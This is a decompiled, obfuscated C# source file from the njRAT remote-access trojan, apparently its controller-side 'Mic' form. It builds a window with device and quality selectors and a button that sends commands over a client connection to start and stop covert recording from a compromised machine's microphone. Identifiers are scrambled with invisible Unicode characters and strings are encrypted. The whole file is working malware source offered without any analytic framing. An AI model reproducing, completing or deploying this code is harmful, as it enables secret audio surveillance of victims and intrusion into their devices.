using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace njRAT
{
	// Token: 0x02000040 RID: 64
	[DesignerGenerated]
	public partial class Mic : Form
	{
		// Token: 0x0600032F RID: 815 RVA: 0x0002458C File Offset: 0x0002278C
		public Mic()
		{
			base.FormClosing += this.\u0002;
			base.Load += this.\u0002;
			this.QQ = string.Empty;
			this.\u0002();
		}

		// Token: 0x06000331 RID: 817 RVA: 0x00024614 File Offset: 0x00022814
		[DebuggerStepThrough]
		private void \u0002()
		{
			this.\u0002 = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Mic));
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002(new ComboBox());
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002(new Button());
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002(new Timer(this.\u0002));
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002(new Label());
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003(new ComboBox());
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002(new ProgressBar());
			this.SuspendLayout();
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().DropDownStyle = ComboBoxStyle.DropDownList;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().FlatStyle = FlatStyle.Flat;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().FormattingEnabled = true;
			Control control = this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002();
			Point location = new Point(2, 3);
			control.Location = location;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829138495);
			Control control2 = this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002();
			Size size = new Size(224, 22);
			control2.Size = size;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().TabIndex = 0;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().FlatStyle = FlatStyle.Flat;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			Control control3 = this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002();
			location = new Point(232, 3);
			control3.Location = location;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829139756);
			Control control4 = this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002();
			size = new Size(124, 48);
			control4.Size = size;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().TabIndex = 1;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Text = \u0006\u2001.\u0002(-1829138894);
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().UseVisualStyleBackColor = true;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Enabled = true;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Interval = 50;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().AutoSize = true;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			Control control5 = this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002();
			location = new Point(5, 33);
			control5.Location = location;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829139932);
			Control control6 = this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002();
			size = new Size(64, 14);
			control6.Size = size;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().TabIndex = 2;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Text = \u0006\u2001.\u0002(-1829124658);
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003().BackColor = Color.Black;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003().DropDownStyle = ComboBoxStyle.DropDownList;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003().FlatStyle = FlatStyle.Flat;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003().ForeColor = Color.LightSteelBlue;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003().FormattingEnabled = true;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003().Items.AddRange(new object[]
			{
				\u0006\u2001.\u0002(-1829124643),
				\u0006\u2001.\u0002(-1829125075),
				\u0006\u2001.\u0002(-1829125059),
				\u0006\u2001.\u0002(-1829125107),
				\u0006\u2001.\u0002(-1829125092),
				\u0006\u2001.\u0002(-1829125014),
				\u0006\u2001.\u0002(-1829125000),
				\u0006\u2001.\u0002(-1829125050)
			});
			Control control7 = this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003();
			location = new Point(86, 30);
			control7.Location = location;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003().Name = \u0006\u2001.\u0002(-1829138871);
			Control control8 = this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003();
			size = new Size(140, 22);
			control8.Size = size;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003().TabIndex = 3;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Bottom;
			Control control9 = this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002();
			location = new Point(0, 54);
			control9.Location = location;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829138855);
			Control control10 = this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002();
			size = new Size(357, 10);
			control10.Size = size;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().TabIndex = 4;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(357, 64);
			this.ClientSize = size;
			this.Controls.Add(this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002());
			this.Controls.Add(this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003());
			this.Controls.Add(this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002());
			this.Controls.Add(this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002());
			this.Controls.Add(this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002());
			this.ForeColor = Color.White;
			this.FormBorderStyle = FormBorderStyle.FixedSingle;
			this.Icon = (Icon)componentResourceManager.GetObject(\u0006\u2001.\u0002(-1829139480));
			this.MaximizeBox = false;
			this.Name = \u0006\u2001.\u0002(-1829125036);
			this.Text = \u0006\u2001.\u0002(-1829125036);
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		// Token: 0x06000332 RID: 818 RVA: 0x00024B30 File Offset: 0x00022D30
		internal virtual ComboBox 8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0003;
		}

		// Token: 0x06000333 RID: 819 RVA: 0x00024B44 File Offset: 0x00022D44
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002(ComboBox \u0002)
		{
			this.\u0003 = \u0002;
		}

		// Token: 0x06000334 RID: 820 RVA: 0x00024B50 File Offset: 0x00022D50
		internal virtual Button 8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0005;
		}

		// Token: 0x06000335 RID: 821 RVA: 0x00024B64 File Offset: 0x00022D64
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002(Button \u0002)
		{
			EventHandler value = new EventHandler(this.\u0003);
			if (this.\u0005 != null)
			{
				this.\u0005.Click -= value;
			}
			this.\u0005 = \u0002;
			if (this.\u0005 != null)
			{
				this.\u0005.Click += value;
			}
		}

		// Token: 0x06000336 RID: 822 RVA: 0x00024BB4 File Offset: 0x00022DB4
		internal virtual Timer 8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0008;
		}

		// Token: 0x06000337 RID: 823 RVA: 0x00024BC8 File Offset: 0x00022DC8
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002(Timer \u0002)
		{
			EventHandler value = new EventHandler(this.\u0005);
			if (this.\u0008 != null)
			{
				this.\u0008.Tick -= value;
			}
			this.\u0008 = \u0002;
			if (this.\u0008 != null)
			{
				this.\u0008.Tick += value;
			}
		}

		// Token: 0x06000338 RID: 824 RVA: 0x00024C18 File Offset: 0x00022E18
		internal virtual Label 8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0006;
		}

		// Token: 0x06000339 RID: 825 RVA: 0x00024C2C File Offset: 0x00022E2C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002(Label \u0002)
		{
			this.\u0006 = \u0002;
		}

		// Token: 0x0600033A RID: 826 RVA: 0x00024C38 File Offset: 0x00022E38
		internal virtual ComboBox 8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003()
		{
			return this.\u000E;
		}

		// Token: 0x0600033B RID: 827 RVA: 0x00024C4C File Offset: 0x00022E4C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003(ComboBox \u0002)
		{
			this.\u000E = \u0002;
		}

		// Token: 0x0600033C RID: 828 RVA: 0x00024C58 File Offset: 0x00022E58
		internal virtual ProgressBar 8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u000F;
		}

		// Token: 0x0600033D RID: 829 RVA: 0x00024C6C File Offset: 0x00022E6C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002(ProgressBar \u0002)
		{
			this.\u000F = \u0002;
		}

		// Token: 0x0600033E RID: 830 RVA: 0x00024C78 File Offset: 0x00022E78
		private void \u0002(object \u0002, FormClosingEventArgs \u0003)
		{
			try
			{
				if (this.sk.CN)
				{
					this.sk.Send(\u0006\u2001.\u0002(-1829139089) + \u000E\u2000.\u000E + \u0006\u2001.\u0002(-1829124950));
				}
				this.sk.CN = false;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600033F RID: 831 RVA: 0x00024CF4 File Offset: 0x00022EF4
		private void \u0002(object \u0002, EventArgs \u0003)
		{
			try
			{
				this.QQ = Conversions.ToString(\u000E\u2000.\u0002(this.osk.L));
				this.Text = global::\u000E.\u0002(0L) + \u0006\u2001.\u0002(-1829139381) + this.QQ;
			}
			catch (Exception ex)
			{
			}
			if (this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Items.Count == 0)
			{
				this.Close();
				return;
			}
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().ImageAlign = ContentAlignment.MiddleLeft;
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Image = \u0002\u2001.\u0008();
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().SelectedIndex = 0;
			if (\u000E\u2000.\u0002.\u0006\u2000 > checked(this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003().Items.Count - 1))
			{
				\u000E\u2000.\u0002.\u0006\u2000 = 0;
			}
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003().SelectedIndex = \u000E\u2000.\u0002.\u0006\u2000;
			if (\u000E\u2000.\u0002.\u0008\u2000)
			{
				this.\u0003(RuntimeHelpers.GetObjectValue(\u0002), \u0003);
			}
		}

		// Token: 0x06000340 RID: 832 RVA: 0x00024E08 File Offset: 0x00023008
		private void \u0003(object \u0002, EventArgs \u0003)
		{
			if (Operators.CompareString(this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Text, \u0006\u2001.\u0002(-1829138894), false) == 0)
			{
				this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Text = \u0006\u2001.\u0002(-1829138787);
				this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Image = \u0002\u2001.\u0005();
				this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Enabled = false;
				this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003().Enabled = false;
				int value = 0;
				if (this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003().Text.Contains(\u0006\u2001.\u0002(-1829124959)))
				{
					value = 1;
				}
				this.sk.Send(string.Concat(new string[]
				{
					\u0006\u2001.\u0002(-1829139089),
					\u000E\u2000.\u000E,
					this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().SelectedIndex.ToString(),
					\u000E\u2000.\u000E,
					Conversions.ToString(checked((int)Math.Round(unchecked(Conversions.ToDouble(this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003().Text.Split(new char[]
					{
						' '
					})[0]) * 1024.0)))),
					\u000E\u2000.\u000E,
					Conversions.ToString(value)
				}));
			}
			else
			{
				this.sk.Send(\u0006\u2001.\u0002(-1829139089) + \u000E\u2000.\u000E + \u0006\u2001.\u0002(-1829124950));
				this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Image = \u0002\u2001.\u0008();
				this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Text = \u0006\u2001.\u0002(-1829138894);
				this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Enabled = true;
				this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003().Enabled = true;
			}
		}

		// Token: 0x06000341 RID: 833 RVA: 0x00024F9C File Offset: 0x0002319C
		private void \u0005(object \u0002, EventArgs \u0003)
		{
			try
			{
				if (this.osk == null | this.sk == null)
				{
					this.Close();
					return;
				}
				if (!this.osk.CN | !this.sk.CN)
				{
					this.Close();
				}
			}
			catch (Exception ex)
			{
			}
			this.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Value = this.sk.rp();
		}

		// Token: 0x040001F6 RID: 502
		[AccessedThroughProperty("ComboBox1")]
		private ComboBox \u0003;

		// Token: 0x040001F7 RID: 503
		[AccessedThroughProperty("Button1")]
		private Button \u0005;

		// Token: 0x040001F8 RID: 504
		[AccessedThroughProperty("Timer1")]
		private Timer \u0008;

		// Token: 0x040001F9 RID: 505
		[AccessedThroughProperty("Label1")]
		private Label \u0006;

		// Token: 0x040001FA RID: 506
		[AccessedThroughProperty("ComboBox2")]
		private ComboBox \u000E;

		// Token: 0x040001FB RID: 507
		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar \u000F;

		// Token: 0x040001FC RID: 508
		public Client sk;

		// Token: 0x040001FD RID: 509
		public Client osk;

		// Token: 0x040001FE RID: 510
		public string QQ;
	}
}
